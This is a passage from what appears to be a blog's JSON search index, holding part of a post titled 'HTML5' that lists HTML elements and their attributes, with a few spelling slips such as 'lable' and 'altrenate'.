readonly, required, size, src, type (button; checkbox; color; date; datetime; datetime-local; email; file; hidden; image; month; number; password; radio; range; reset; search; submit; tel; text; time; url; week), value, width textarea: autofocus, cols, disabled, maxlength, name, readonly, required, rows, wrap button: autofocus, disabled, formaction, formenctype, formmethod, formtarget, name, type (button; reset; submit), value select: autofocus, disabled, multiple, name, required, size optgroup: disabled, label option: disabled, label, selected, value lable: for iframe: height, name, src, width img: loading (eager; lazy), alt, height, ismap, src, usemap, width area: alt, coords, href, hreflang, media, rel, shape (default; rect; circle; poly), target, type (MIME) canvas: height, width svg: height, width, xmlns (http://www.w3.org/2000/svg), version (1.1; 1.2; 2.0) audio: autoplay, controls, loop, src source: src, type, srcset video: autoplay, controls, height, loop, muted, poster, src, width a: download, href, hreflang, media, rel (altrenate; author; bookmark; help; license; next; nofollow; noreference; prefetch; prev; search; tag), target, type link: href, hreflang, media, rel, type th: colspan, headers, rowspan, scope (col; colgroup; row; rowgroup) td: colspan, headers, rowspan col: span colgroup: span base: href, target meta: charset, content, http-equiv, name script: async, charset, defer, src, type embed: height, src, type, width object: data, height, name, type, usemap, width 字符集 ASCII, utf-8, ISO-8859-1, URL, 实体符号, ISO-639-1\n","date":"2023-08-20T00:00:00Z","permalink":"https://example.com/p/html5/","title":"HTML5"}]